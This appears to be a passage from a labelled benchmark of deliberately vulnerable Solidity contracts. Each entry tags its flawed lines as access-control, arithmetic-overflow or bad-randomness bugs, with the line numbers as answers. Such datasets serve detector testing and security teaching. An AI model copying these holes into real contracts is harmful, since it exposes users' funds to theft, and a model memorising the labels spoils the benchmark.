        require(tx.origin == owner);
        _recipient.transfer(this.balance);
    }
}",[15]
"/*
 * @source: https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-112#proxysol
 * @author: -
 * @vulnerable_at_lines: 19
 */
pragma solidity ^0.4.24;
contract Proxy {
  address owner;
  constructor() public {
    owner = msg.sender;
  }
  function forward(address callee, bytes _data) public {
    // <yes> <report> ACCESS_CONTROL
    require(callee.delegatecall(_data)); //Use delegatecall with caution and make sure to never call into untrusted contracts
  }
}",[14]
"/*
 * @source: https://github.com/trailofbits/not-so-smart-contracts/blob/master/wrong_constructor_name/Rubixi_source_code/Rubixi.sol
 * @author: -
* @vulnerable_at_lines: 23,24
 */
 // 0xe82719202e5965Cf5D9B6673B7503a3b92DE20be#code
 pragma solidity ^0.4.15;
 contract Rubixi {
         //Declare variables for storage critical to contract
         uint private balance = 0;
         uint private collectedFees = 0;
         uint private feePercent = 10;
         uint private pyramidMultiplier = 300;
         uint private payoutOrder = 0;
         address private creator;
         //Sets creator
         // <yes> <report> ACCESS_CONTROL
         function DynamicPyramid() {
                 creator = msg.sender; //anyone can call this
         }
         modifier onlyowner {
                 if (msg.sender == creator) _;
         }
         struct Participant {
                 address etherAddress;
                 uint payout;
         }
         Participant[] private participants;
         //Fallback function
         function() {
                 init();
         }
         //init function run on fallback
         function init() private {
                 //Ensures only tx with value of 1 ether or greater are processed and added to pyramid
                 if (msg.value < 1 ether) {
                         collectedFees += msg.value;
                         return;
                 }
                 uint _fee = feePercent;
                 //50% fee rebate on any ether value of 50 or greater
                 if (msg.value >= 50 ether) _fee /= 2;
                 addPayout(_fee);
         }
         //Function called for valid tx to the contract
         function addPayout(uint _fee) private {
                 //Adds new address to participant array
                 participants.push(Participant(msg.sender, (msg.value * pyramidMultiplier) / 100));
                 //These statements ensure a quicker payout system to later pyramid entrants, so the pyramid has a longer lifespan
                 if (participants.length == 10) pyramidMultiplier = 200;
                 else if (participants.length == 25) pyramidMultiplier = 150;
                 // collect fees and update contract balance
                 balance += (msg.value * (100 - _fee)) / 100;
                 collectedFees += (msg.value * _fee) / 100;
                 //Pays earlier participiants if balance sufficient
                 while (balance > participants[payoutOrder].payout) {
                         uint payoutToSend = participants[payoutOrder].payout;
                         participants[payoutOrder].etherAddress.send(payoutToSend);
                         balance -= participants[payoutOrder].payout;
                         payoutOrder += 1;
                 }
         }
         //Fee functions for creator
         function collectAllFees() onlyowner {
                 if (collectedFees == 0) throw;
                 creator.send(collectedFees);
                 collectedFees = 0;
         }
         function collectFeesInEther(uint _amt) onlyowner {
                 _amt *= 1 ether;
                 if (_amt > collectedFees) collectAllFees();
                 if (collectedFees == 0) throw;
                 creator.send(_amt);
                 collectedFees -= _amt;
         }
         function collectPercentOfFees(uint _pcent) onlyowner {
                 if (collectedFees == 0 || _pcent > 100) throw;
                 uint feesToCollect = collectedFees / 100 * _pcent;
                 creator.send(feesToCollect);
                 collectedFees -= feesToCollect;
         }
         //Functions for changing variables related to the contract
         function changeOwner(address _owner) onlyowner {
                 creator = _owner;
         }
         function changeMultiplier(uint _mult) onlyowner {
                 if (_mult > 300 || _mult < 120) throw;
                 pyramidMultiplier = _mult;
         }
         function changeFeePercentage(uint _fee) onlyowner {
                 if (_fee > 10) throw;
                 feePercent = _fee;
         }
         //Functions to provide information to end-user using JSON interface or other interfaces
         function currentMultiplier() constant returns(uint multiplier, string info) {
                 multiplier = pyramidMultiplier;
                 info = 'This multiplier applies to you as soon as transaction is received, may be lowered to hasten payouts or increased if payouts are fast enough. Due to no float or decimals, multiplier is x100 for a fractional multiplier e.g. 250 is actually a 2.5x multiplier. Capped at 3x max and 1.2x min.';
         }
         function currentFeePercentage() constant returns(uint fee, string info) {
                 fee = feePercent;
                 info = 'Shown in % form. Fee is halved(50%) for amounts equal or greater than 50 ethers. (Fee may change, but is capped to a maximum of 10%)';
         }
         function currentPyramidBalanceApproximately() constant returns(uint pyramidBalance, string info) {
                 pyramidBalance = balance / 1 ether;
                 info = 'All balance values are measured in Ethers, note that due to no decimal placing, these values show up as integers only, within the contract itself you will get the exact decimal value you are supposed to';
         }
         function nextPayoutWhenPyramidBalanceTotalsApproximately() constant returns(uint balancePayout) {
                 balancePayout = participants[payoutOrder].payout / 1 ether;
         }
         function feesSeperateFromBalanceApproximately() constant returns(uint fees) {
                 fees = collectedFees / 1 ether;
         }
         function totalParticipants() constant returns(uint count) {
                 count = participants.length;
         }
         function numberOfParticipantsWaitingForPayout() constant returns(uint count) {
                 count = participants.length - payoutOrder;
         }
         function participantDetails(uint orderInPyramid) constant returns(address Address, uint Payout) {
                 if (orderInPyramid <= participants.length) {
                         Address = participants[orderInPyramid].etherAddress;
                         Payout = participants[orderInPyramid].payout / 1 ether;
                 }
         }
 }","[18, 19]"
"/*
 * @source: https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/unprotected_critical_functions/simple_suicide.sol
 * @author: -
 * @vulnerable_at_lines: 12,13
 */
//added prgma version
pragma solidity ^0.4.0;
contract SimpleSuicide {
  // <yes> <report> ACCESS_CONTROL
  function sudicideAnyone() {
    selfdestruct(msg.sender);
  }
}","[10, 11]"
"/*
 * @source: https://github.com/trailofbits/not-so-smart-contracts/blob/master/unprotected_function/Unprotected.sol
 * @author: -
 * @vulnerable_at_lines: 25
 */
 pragma solidity ^0.4.15;
 contract Unprotected{
     address private owner;
     modifier onlyowner {
         require(msg.sender==owner);
         _;
     }
     function Unprotected()
         public
     {
         owner = msg.sender;
     }
     // This function should be protected
     // <yes> <report> ACCESS_CONTROL
     function changeOwner(address _newOwner)
         public
     {
        owner = _newOwner;
     }
    /*
    function changeOwner_fixed(address _newOwner)
         public
         onlyowner
     {
        owner = _newOwner;
     }
     */
 }",[20]
"/*
 * @source: https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-105#wallet-02-refund-nosubsol
 * @author: -
 * @vulnerable_at_lines: 36
 */
 pragma solidity ^0.4.24;
 /* User can add pay in and withdraw Ether.
    Unfortunately the developer forgot set the user's balance to 0 when refund() is called.
    An attacker can pay in a small amount of Ether and call refund() repeatedly to empty the contract.
 */
 contract Wallet {
     address creator;
     mapping(address => uint256) balances;
     constructor() public {
         creator = msg.sender;
     }
     function deposit() public payable {
         assert(balances[msg.sender] + msg.value > balances[msg.sender]);
         balances[msg.sender] += msg.value;
     }
     function withdraw(uint256 amount) public {
         require(amount <= balances[msg.sender]);
         msg.sender.transfer(amount);
         balances[msg.sender] -= amount;
     }
     function refund() public {
         // <yes> <report> ACCESS_CONTROL
         msg.sender.transfer(balances[msg.sender]);
     }
     // In an emergency the owner can migrate  allfunds to a different address.
     function migrateTo(address to) public {
         require(creator == msg.sender);
         to.transfer(this.balance);
     }
 }",[28]
"/*
 * @source: https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-105#wallet-03-wrong-constructorsol
 * @author: -
 * @vulnerable_at_lines: 19,20
 */
 pragma solidity ^0.4.24;
 /* User can add pay in and withdraw Ether.
    The constructor is wrongly named, so anyone can become 'creator' and withdraw all funds.
 */
 contract Wallet {
     address creator;
     mapping(address => uint256) balances;
     // <yes> <report> ACCESS_CONTROL
     function initWallet() public {
         creator = msg.sender;
     }
     function deposit() public payable {
         assert(balances[msg.sender] + msg.value > balances[msg.sender]);
         balances[msg.sender] += msg.value;
     }
     function withdraw(uint256 amount) public {
         require(amount <= balances[msg.sender]);
         msg.sender.transfer(amount);
         balances[msg.sender] -= amount;
     }
     // In an emergency the owner can migrate  allfunds to a different address.
     function migrateTo(address to) public {
         require(creator == msg.sender);
         to.transfer(this.balance);
     }
 }","[14, 15]"
"/*
 * @source: https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-105#wallet-04-confused-signsol
 * @author: -
 * @vulnerable_at_lines: 30
 */
 pragma solidity ^0.4.24;
 /* User can add pay in and withdraw Ether.
    Unfortunatelty, the developer was drunk and used the wrong comparison operator in ""withdraw()""
    Anybody can withdraw arbitrary amounts of Ether :()
 */
 contract Wallet {
     address creator;
     mapping(address => uint256) balances;
     constructor() public {
         creator = msg.sender;
     }
     function deposit() public payable {
         assert(balances[msg.sender] + msg.value > balances[msg.sender]);
         balances[msg.sender] += msg.value;
     }
     function withdraw(uint256 amount) public {
         // <yes> <report> ACCESS_CONTROL
         require(amount >= balances[msg.sender]);
         msg.sender.transfer(amount);
         balances[msg.sender] -= amount;
     }
     // In an emergency the owner can migrate  allfunds to a different address.
     function migrateTo(address to) public {
         require(creator == msg.sender);
         to.transfer(this.balance);
     }
 }",[23]
"   * @param newOwner The address to transfer ownership to.
   */
  function transferOwnership(address newOwner) onlyOwner public {
    require(newOwner != address(0));
    OwnershipTransferred(owner, newOwner);
    owner = newOwner;
  }
}
/**
 * @title Pausable
 * @dev Base contract which allows children to implement an emergency stop mechanism.
 */
contract Pausable is Ownable {
  event Pause();
  event Unpause();
  bool public paused = false;
  /**
   * @dev Modifier to make a function callable only when the contract is not paused.
   */
  modifier whenNotPaused() {
    require(!paused);
    _;
  }
  /**
   * @dev Modifier to make a function callable only when the contract is paused.
   */
  modifier whenPaused() {
    require(paused);
    _;
  }
  /**
   * @dev called by the owner to pause, triggers stopped state
   */
  function pause() onlyOwner whenNotPaused public {
    paused = true;
    Pause();
  }
  /**
   * @dev called by the owner to unpause, returns to normal state
   */
  function unpause() onlyOwner whenPaused public {
    paused = false;
    Unpause();
  }
}
/**
 * @title Pausable token
 *
 * @dev StandardToken modified with pausable transfers.
 **/
contract PausableToken is StandardToken, Pausable {
  function transfer(address _to, uint256 _value) public whenNotPaused returns (bool) {
    return super.transfer(_to, _value);
  }
  function transferFrom(address _from, address _to, uint256 _value) public whenNotPaused returns (bool) {
    return super.transferFrom(_from, _to, _value);
  }
  function approve(address _spender, uint256 _value) public whenNotPaused returns (bool) {
    return super.approve(_spender, _value);
  }
  function batchTransfer(address[] _receivers, uint256 _value) public whenNotPaused returns (bool) {
    uint cnt = _receivers.length;
    // <yes> <report> ARITHMETIC
    uint256 amount = uint256(cnt) * _value;
    require(cnt > 0 && cnt <= 20);
    require(_value > 0 && balances[msg.sender] >= amount);
    balances[msg.sender] = balances[msg.sender].sub(amount);
    for (uint i = 0; i < cnt; i++) {
        balances[_receivers[i]] = balances[_receivers[i]].add(_value);
        Transfer(msg.sender, _receivers[i], _value);
    }
    return true;
  }
}
/**
 * @title Bec Token
 *
 * @dev Implementation of Bec Token based on the basic standard token.
 */
contract BecToken is PausableToken {
    /**
    * Public variables of the token
    * The following variables are OPTIONAL vanities. One does not have to include them.
    * They allow one to customise the token contract & in no way influences the core functionality.
    * Some wallets/interfaces might not even bother to look at this information.
    */
    string public name = ""BeautyChain"";
    string public symbol = ""BEC"";
    string public version = '1.0.0';
    uint8 public decimals = 18;
    /**
     * @dev Function to check the amount of tokens that an owner allowed to a spender.
     */
    function BecToken() {
      totalSupply = 7000000000 * (10**(uint256(decimals)));
      balances[msg.sender] = totalSupply;    // Give the creator all initial tokens
    }
    function () {
        //if ether is sent to this address, send it back.
        revert();
    }
}",[64]
"/*
 * @source: https://consensys.github.io/smart-contract-best-practices/known_attacks/#front-running-aka-transaction-ordering-dependence
 * @author: consensys
 * @vulnerable_at_lines: 18
 */
pragma solidity ^0.4.10;
contract IntegerOverflowAdd {
    mapping (address => uint256) public balanceOf;
    // INSECURE
    function transfer(address _to, uint256 _value) public{
        /* Check if sender has balance */
        require(balanceOf[msg.sender] >= _value);
        balanceOf[msg.sender] -= _value;
        // <yes> <report> ARITHMETIC
        balanceOf[_to] += _value;
}
}",[15]
"/*
 * @source: https://github.com/trailofbits/not-so-smart-contracts/blob/master/integer_overflow/integer_overflow_1.sol
 * @author: -
 * @vulnerable_at_lines: 14
 */
 pragma solidity ^0.4.15;
 contract Overflow {
     uint private sellerBalance=0;
     function add(uint value) returns (bool){
         // <yes> <report> ARITHMETIC
         sellerBalance += value; // possible overflow
         // possible auditor assert
         // assert(sellerBalance >= value);
     }
  // function safe_add(uint value) returns (bool){
  //   require(value + sellerBalance >= sellerBalance);
  // sellerBalance += value;
  // } 
 }",[11]
"/*
 * @source: https://github.com/ConsenSys/evm-analyzer-benchmark-suite/blob/master/benchmarks/integer_overflow_add.sol
 * @author: -
 * @vulnerable_at_lines: 17
 */
//Single transaction overflow
//Post-transaction effect: overflow escapes to publicly-readable storage
pragma solidity ^0.4.19;
contract IntegerOverflowAdd {
    uint public count = 1;
    function run(uint256 input) public {
        // <yes> <report> ARITHMETIC
        count += input;
    }
}",[13]
"/*
 * @source: https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/integer_overflow_and_underflow/integer_overflow_benign_1.sol
 * @author: -
 * @vulnerable_at_lines: 17
 */
//Single transaction overflow
//Post-transaction effect: overflow never escapes function
pragma solidity ^0.4.19;
contract IntegerOverflowBenign1 {
    uint public count = 1;
    function run(uint256 input) public {
        // <yes> <report> ARITHMETIC
        uint res = count - input;
    }
}",[13]
"/*
 * @source: https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/integer_overflow_and_underflow/integer_overflow_mapping_sym_1.sol
 * @author: -
 * @vulnerable_at_lines: 16
 */
//Single transaction overflow
pragma solidity ^0.4.11;
contract IntegerOverflowMappingSym1 {
    mapping(uint256 => uint256) map;
    function init(uint256 k, uint256 v) public {
        // <yes> <report> ARITHMETIC
        map[k] -= v;
    }
}",[12]
"/*
 * @source: https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/integer_overflow_and_underflow/integer_overflow_minimal.sol
 * @author: -
 * @vulnerable_at_lines: 17
 */
//Single transaction overflow
//Post-transaction effect: overflow escapes to publicly-readable storage
pragma solidity ^0.4.19;
contract IntegerOverflowMinimal {
    uint public count = 1;
    function run(uint256 input) public {
        // <yes> <report> ARITHMETIC
        count -= input;
    }
}",[13]
"/*
 * @source: https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/integer_overflow_and_underflow/integer_overflow_mul.sol
 * @author: -
 * @vulnerable_at_lines: 17
 */
//Single transaction overflow
//Post-transaction effect: overflow escapes to publicly-readable storage
pragma solidity ^0.4.19;
contract IntegerOverflowMul {
    uint public count = 2;
    function run(uint256 input) public {
        // <yes> <report> ARITHMETIC
        count *= input;
    }
}",[13]
"/*
 * @source: https://github.com/ConsenSys/evm-analyzer-benchmark-suite
 * @author: Suhabe Bugrara
 * @vulnerable_at_lines: 25
 */
//Multi-transactional, multi-function
//Arithmetic instruction reachable
pragma solidity ^0.4.23;
contract IntegerOverflowMultiTxMultiFuncFeasible {
    uint256 private initialized = 0;
    uint256 public count = 1;
    function init() public {
        initialized = 1;
    }
    function run(uint256 input) {
        if (initialized == 0) {
            return;
        }
        // <yes> <report> ARITHMETIC
        count -= input;
    }
}",[20]
"/*
 * @source: https://github.com/ConsenSys/evm-analyzer-benchmark-suite
 * @author: Suhabe Bugrara
 * @vulnerable_at_lines: 22
 */
//Multi-transactional, single function
//Arithmetic instruction reachable
pragma solidity ^0.4.23;
contract IntegerOverflowMultiTxOneFuncFeasible {
    uint256 private initialized = 0;
    uint256 public count = 1;
    function run(uint256 input) public {
        if (initialized == 0) {
            initialized = 1;
            return;
        }
        // <yes> <report> ARITHMETIC
        count -= input;
    }
}",[18]
"/*
 * @source: https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-101#overflow-simple-addsol
 * @author: -
 * @vulnerable_at_lines: 14
 */
pragma solidity 0.4.25;
contract Overflow_Add {
    uint public balance = 1;
    function add(uint256 deposit) public {
        // <yes> <report> ARITHMETIC
        balance += deposit;
    }
}",[11]
"/*
 * @source: https://github.com/ConsenSys/evm-analyzer-benchmark-suite
 * @author: Suhabe Bugrara
 * @vulnerable_at_lines: 18,24,30,36,42,48
 */
//Single transaction overflow
//Post-transaction effect: overflow escapes to publicly-readable storage
pragma solidity ^0.4.23;
contract IntegerOverflowSingleTransaction {
    uint public count = 1;
    // ADD overflow with result stored in state variable.
    function overflowaddtostate(uint256 input) public {
        // <yes> <report> ARITHMETIC
        count += input;
    }
    // MUL overflow with result stored in state variable.
    function overflowmultostate(uint256 input) public {
        // <yes> <report> ARITHMETIC
        count *= input;
    }
    // Underflow with result stored in state variable.
    function underflowtostate(uint256 input) public {
        // <yes> <report> ARITHMETIC
        count -= input;
    }
    // ADD Overflow, no effect on state.
    function overflowlocalonly(uint256 input) public {
        // <yes> <report> ARITHMETIC
        uint res = count + input;
    }
    // MUL Overflow, no effect on state.
    function overflowmulocalonly(uint256 input) public {
        // <yes> <report> ARITHMETIC
        uint res = count * input;
    }
    // Underflow, no effect on state.
    function underflowlocalonly(uint256 input) public {
        // <yes> <report> ARITHMETIC
       	uint res = count - input;
    }
}","[14, 19, 24, 29, 34, 39]"
"/*
 * @source: https://github.com/sigp/solidity-security-blog
 * @author: -
 * @vulnerable_at_lines: 22
 */
//added pragma version
 pragma solidity ^0.4.10;
 contract TimeLock {
     mapping(address => uint) public balances;
     mapping(address => uint) public lockTime;
     function deposit() public payable {
         balances[msg.sender] += msg.value;
         lockTime[msg.sender] = now + 1 weeks;
     }
     function increaseLockTime(uint _secondsToIncrease) public {
         // <yes> <report> ARITHMETIC
         lockTime[msg.sender] += _secondsToIncrease;
     }
     function withdraw() public {
         require(balances[msg.sender] > 0);
         require(now > lockTime[msg.sender]);
         uint transferValue = balances[msg.sender];
         balances[msg.sender] = 0;
         msg.sender.transfer(transferValue);
     }
 }",[17]
"/*
 * @source: https://github.com/sigp/solidity-security-blog
 * @author: Steve Marx
 * @vulnerable_at_lines: 20,22
 */
 pragma solidity ^0.4.18;
 contract Token {
   mapping(address => uint) balances;
   uint public totalSupply;
   function Token(uint _initialSupply) {
     balances[msg.sender] = totalSupply = _initialSupply;
   }
   function transfer(address _to, uint _value) public returns (bool) {
     // <yes> <report> ARITHMETIC
     require(balances[msg.sender] - _value >= 0);
     // <yes> <report> ARITHMETIC
     balances[msg.sender] -= _value;
     balances[_to] += _value;
     return true;
   }
   function balanceOf(address _owner) public constant returns (uint balance) {
     return balances[_owner];
   }
 }","[15, 17]"
"/*
 * @source: https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-101 // https://capturetheether.com/challenges/math/token-sale/
 * @author: Steve Marx
 * @vulnerable_at_lines: 23,25,33
 */
pragma solidity ^0.4.21;
contract TokenSaleChallenge {
    mapping(address => uint256) public balanceOf;
    uint256 constant PRICE_PER_TOKEN = 1 ether;
    function TokenSaleChallenge(address _player) public payable {
        require(msg.value == 1 ether);
    }
    function isComplete() public view returns (bool) {
        return address(this).balance < 1 ether;
    }
    function buy(uint256 numTokens) public payable {
        // <yes> <report> ARITHMETIC
        require(msg.value == numTokens * PRICE_PER_TOKEN);
        // <yes> <report> ARITHMETIC
        balanceOf[msg.sender] += numTokens;
    }
    function sell(uint256 numTokens) public {
        require(balanceOf[msg.sender] >= numTokens);
        balanceOf[msg.sender] -= numTokens;
        // <yes> <report> ARITHMETIC
        msg.sender.transfer(numTokens * PRICE_PER_TOKEN);
    }
}","[18, 20, 26]"
"/*
 * @article: https://blog.positive.com/predicting-random-numbers-in-ethereum-smart-contracts-e5358c6b8620
 * @source: https://etherscan.io/address/0xa65d59708838581520511d98fb8b5d1f76a96cad#code
 * @vulnerable_at_lines: 17,19,21
 * @author: -
 */
 pragma solidity ^0.4.9;
library Deck {
	// returns random number from 0 to 51
	// let's say 'value' % 4 means suit (0 - Hearts, 1 - Spades, 2 - Diamonds, 3 - Clubs)
	//			 'value' / 4 means: 0 - King, 1 - Ace, 2 - 10 - pip values, 11 - Jacket, 12 - Queen
	function deal(address player, uint8 cardNumber) internal returns (uint8) {
		// <yes> <report> BAD_RANDOMNESS
		uint b = block.number;
		// <yes> <report> BAD_RANDOMNESS
		uint timestamp = block.timestamp;
		// <yes> <report> BAD_RANDOMNESS
		return uint8(uint256(keccak256(block.blockhash(b), player, cardNumber, timestamp)) % 52);
	}
	function valueOf(uint8 card, bool isBigAce) internal constant returns (uint8) {
		uint8 value = card / 4;
		if (value == 0 || value == 11 || value == 12) { // Face cards
			return 10;
		}
		if (value == 1 && isBigAce) { // Ace is worth 11
			return 11;
		}
		return value;
	}
	function isAce(uint8 card) internal constant returns (bool) {
		return card / 4 == 1;
	}
	function isTen(uint8 card) internal constant returns (bool) {
		return card / 4 == 10;
	}
}
contract BlackJack {
	using Deck for *;
	uint public minBet = 50 finney; // 0.05 eth
	uint public maxBet = 5 ether;
	uint8 BLACKJACK = 21;
  enum GameState { Ongoing, Player, Tie, House }
	struct Game {
		address player; // address игрока
		uint bet; // стывка
		uint8[] houseCards; // карты диллера
		uint8[] playerCards; // карты игрока
		GameState state; // состояние
		uint8 cardsDealt;
	}
	mapping (address => Game) public games;
	modifier gameIsGoingOn() {
		if (games[msg.sender].player == 0 || games[msg.sender].state != GameState.Ongoing) {
			throw; // game doesn't exist or already finished
		}
		_;
	}
	event Deal(
        bool isUser,
        uint8 _card
    );
    event GameStatus(
    	uint8 houseScore,
    	uint8 houseScoreBig,
    	uint8 playerScore,
    	uint8 playerScoreBig
    );
    event Log(
    	uint8 value
    );
	function BlackJack() {
	}
	function () payable {
	}
	// starts a new game
	function deal() public payable {
		if (games[msg.sender].player != 0 && games[msg.sender].state == GameState.Ongoing) {
			throw; // game is already going on
		}
		if (msg.value < minBet || msg.value > maxBet) {","[14, 16, 18]"
"        address contestant,
        uint number
    );
    event TicketRefund(
        uint raffleId,
        address contestant,
        uint number
    );
    // Constants
    uint public constant prize = 2.5 ether;
    uint public constant fee = 0.03 ether;
    uint public constant totalTickets = 50;
    uint public constant pricePerTicket = (prize + fee) / totalTickets; // Make sure this divides evenly
    address feeAddress;
    // Other internal variables
    bool public paused = false;
    uint public raffleId = 1;
    // <yes> <report> BAD_RANDOMNESS
    uint public blockNumber = block.number;
    uint nextTicket = 0;
    mapping (uint => Contestant) contestants;
    uint[] gaps;
    // Initialization
    function Ethraffle_v4b() public {
        feeAddress = msg.sender;
    }
    // Call buyTickets() when receiving Ether outside a function
    function () payable public {
        buyTickets();
    }
    function buyTickets() payable public {
        if (paused) {
            msg.sender.transfer(msg.value);
            return;
        }
        uint moneySent = msg.value;
        while (moneySent >= pricePerTicket && nextTicket < totalTickets) {
            uint currTicket = 0;
            if (gaps.length > 0) {
                currTicket = gaps[gaps.length-1];
                gaps.length--;
            } else {
                currTicket = nextTicket++;
            }
            contestants[currTicket] = Contestant(msg.sender, raffleId);
            TicketPurchase(raffleId, msg.sender, currTicket);
            moneySent -= pricePerTicket;
        }
        // Choose winner if we sold all the tickets
        if (nextTicket == totalTickets) {
            chooseWinner();
        }
        // Send back leftover money
        if (moneySent > 0) {
            msg.sender.transfer(moneySent);
        }
    }
    function chooseWinner() private {
        // <yes> <report> BAD_RANDOMNESS
        address seed1 = contestants[uint(block.coinbase) % totalTickets].addr;
        // <yes> <report> BAD_RANDOMNESS
        address seed2 = contestants[uint(msg.sender) % totalTickets].addr;
        // <yes> <report> BAD_RANDOMNESS
        uint seed3 = block.difficulty;
        bytes32 randHash = keccak256(seed1, seed2, seed3);
        uint winningNumber = uint(randHash) % totalTickets;
        address winningAddress = contestants[winningNumber].addr;
        RaffleResult(raffleId, winningNumber, winningAddress, seed1, seed2, seed3, randHash);
        // Start next raffle
        raffleId++;
        nextTicket = 0;
        // <yes> <report> BAD_RANDOMNESS
        blockNumber = block.number;
        // gaps.length = 0 isn't necessary here,
        // because buyTickets() eventually clears
        // the gaps array in the loop itself.
        // Distribute prize and fee
        winningAddress.transfer(prize);
        feeAddress.transfer(fee);
    }
    // Get your money back before the raffle occurs
    function getRefund() public {
        uint refund = 0;
        for (uint i = 0; i < totalTickets; i++) {
            if (msg.sender == contestants[i].addr && raffleId == contestants[i].raffleId) {
                refund += pricePerTicket;
                contestants[i] = Contestant(address(0), 0);
                gaps.push(i);
                TicketRefund(raffleId, msg.sender, i);
            }
        }
        if (refund > 0) {
            msg.sender.transfer(refund);
        }
    }
    // Refund everyone's money, start a new raffle, then pause it
    function endRaffle() public {
        if (msg.sender == feeAddress) {
            paused = true;
            for (uint i = 0; i < totalTickets; i++) {
                if (raffleId == contestants[i].raffleId) {
                    TicketRefund(raffleId, contestants[i].addr, i);
                    contestants[i].addr.transfer(pricePerTicket);
                }
            }
            RaffleResult(raffleId, totalTickets, address(0), address(0), address(0), 0, 0);
            raffleId++;
            nextTicket = 0;
            // <yes> <report> BAD_RANDOMNESS
            blockNumber = block.number;
            gaps.length = 0;
        }
    }
    function togglePause() public {
        if (msg.sender == feeAddress) {
            paused = !paused;
        }
    }
    function kill() public {
        if (msg.sender == feeAddress) {
            selfdestruct(feeAddress);
        }
    }
}","[19, 60, 62, 64, 73, 110]"
"/*
 * @source: https://capturetheether.com/challenges/lotteries/guess-the-random-number/
 * @author: Steve Marx
 * @vulnerable_at_lines: 15
 */
pragma solidity ^0.4.21;
contract GuessTheRandomNumberChallenge {
    uint8 answer;
    function GuessTheRandomNumberChallenge() public payable {
        require(msg.value == 1 ether);
        // <yes> <report> BAD_RANDOMNESS
        answer = uint8(keccak256(block.blockhash(block.number - 1), now));
    }
    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }
    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);
        if (n == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}",[12]
"/*
 * @article: https://blog.positive.com/predicting-random-numbers-in-ethereum-smart-contracts-e5358c6b8620
 * @source: https://etherscan.io/address/0x80ddae5251047d6ceb29765f38fed1c0013004b7#code
 * @vulnerable_at_lines: 38,42
 * @author: -
 */
 //added pragma version
  pragma solidity ^0.4.0;
 contract Lottery {
     event GetBet(uint betAmount, uint blockNumber, bool won);
     struct Bet {
         uint betAmount;
         uint blockNumber;
         bool won;
     }
     address private organizer;
     Bet[] private bets;
     // Create a new lottery with numOfBets supported bets.
     function Lottery() {
         organizer = msg.sender;
     }
     // Fallback function returns ether
     function() {
         throw;
     }
     // Make a bet
     function makeBet() {
         // Won if block number is even
         // (note: this is a terrible source of randomness, please don't use this with real money)
         // <yes> <report> BAD_RANDOMNESS
         bool won = (block.number % 2) == 0;
         // Record the bet with an event
         // <yes> <report> BAD_RANDOMNESS
         bets.push(Bet(msg.value, block.number, won));
         // Payout if the user won, otherwise take their money
         if(won) {
             if(!msg.sender.send(msg.value)) {
                 // Return ether to sender
                 throw;
             }
         }
     }
     // Get all bets that have been made
     function getBets() {
         if(msg.sender != organizer) { throw; }
         for (uint i = 0; i < bets.length; i++) {
             GetBet(bets[i].betAmount, bets[i].blockNumber, bets[i].won);
         }
     }
     // Suicide :(
     function destroy() {
         if(msg.sender != organizer) { throw; }
         suicide(organizer);
     }
 }","[31, 34]"
"    }
    struct Entry {
        address entryAddress;
        uint deposit;
        uint payout;
        bool paid;
    }
    //Fallback function
    function() {
        init();
    }
    function init() private{
        if (msg.value < 1 ether) {
             msg.sender.send(msg.value);
            return;
        }
        join();
    }
    function join() private {
        //Limit deposits to 1ETH
        uint dValue = 1 ether;
        if (msg.value > 1 ether) {
        	msg.sender.send(msg.value - 1 ether);
        	dValue = 1 ether;
        }
        //Add new users to the users array
        if (users[msg.sender].id == address(0))
        {
            users[msg.sender].id = msg.sender;
            users[msg.sender].deposits = 0;
            users[msg.sender].payoutsReceived = 0;
        }
        //Add new entry to the entries array
        entries.push(Entry(msg.sender, dValue, (dValue * (multiplier) / 100), false));
        users[msg.sender].deposits++;
        unpaidEntries.push(entries.length -1);
        //Collect fees and update contract balance
        balance += (dValue * (100 - fee)) / 100;
        uint index = unpaidEntries.length > 1 ? rand(unpaidEntries.length) : 0;
        Entry theEntry = entries[unpaidEntries[index]];
        //Pay pending entries if the new balance allows for it
        if (balance > theEntry.payout) {
            uint payout = theEntry.payout;
            theEntry.entryAddress.send(payout);
            theEntry.paid = true;
            users[theEntry.entryAddress].payoutsReceived++;
            balance -= payout;
            if (index < unpaidEntries.length - 1)
                unpaidEntries[index] = unpaidEntries[unpaidEntries.length - 1];
            unpaidEntries.length--;
        }
        //Collect money from fees and possible leftovers from errors (actual balance untouched)
        uint fees = this.balance - balance;
        if (fees > 0)
        {
                owner.send(fees);
        }
    }
    //Generate random number between 0 & max
    uint256 constant private FACTOR =  1157920892373161954235709850086879078532699846656405640394575840079131296399;
    // <yes> <report> BAD_RANDOMNESS
    function rand(uint max) constant private returns (uint256 result){
        uint256 factor = FACTOR * 100 / max;
        uint256 lastBlockNumber = block.number - 1;
        uint256 hashVal = uint256(block.blockhash(lastBlockNumber));
        return uint256((uint256(hashVal) / factor)) % max;
    }
    //Contract management
    function changeOwner(address newOwner) onlyowner {
        owner = newOwner;
    }
    function changeMultiplier(uint multi) onlyowner {
        if (multi < 110 || multi > 150) throw;
        multiplier = multi;
    }
    function changeFee(uint newFee) onlyowner {
        if (fee > 5)
            throw;
        fee = newFee;
    }
    //JSON functions
    function multiplierFactor() constant returns (uint factor, string info) {
        factor = multiplier;
        info = 'The current multiplier applied to all deposits. Min 110%, max 150%.';
    }
    function currentFee() constant returns (uint feePercentage, string info) {
        feePercentage = fee;
        info = 'The fee percentage applied to all deposits. It can change to speed payouts (max 5%).';
    }
    function totalEntries() constant returns (uint count, string info) {
        count = entries.length;
        info = 'The number of deposits.';
    }
    function userStats(address user) constant returns (uint deposits, uint payouts, string info)
    {
        if (users[user].id != address(0x0))
        {
            deposits = users[user].deposits;
            payouts = users[user].payoutsReceived;
            info = 'Users stats: total deposits, payouts received.';
        }
    }
    function entryDetails(uint index) constant returns (address user, uint payout, bool paid, string info)
    {
        if (index < entries.length) {
            user = entries[index].entryAddress;
            payout = entries[index].payout / 1 finney;
            paid = entries[index].paid;
            info = 'Entry info: user address, expected payout in Finneys, payout status.';
        }
    }
}","[62, 63, 64, 65, 66]"
"/*
